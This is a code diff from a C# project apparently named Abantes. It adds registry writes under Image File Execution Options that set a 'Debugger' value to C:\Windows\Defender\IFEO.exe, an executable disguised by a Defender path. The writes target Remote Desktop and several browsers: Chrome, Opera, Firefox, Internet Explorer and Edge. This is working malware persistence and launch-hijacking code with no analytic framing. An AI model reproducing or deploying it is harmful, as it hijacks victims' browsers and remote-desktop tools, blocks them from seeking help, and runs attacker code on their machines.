@@ -110,7 +110,25 @@ namespace Abantes
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\xpsrchvw.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe.exe");
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
 
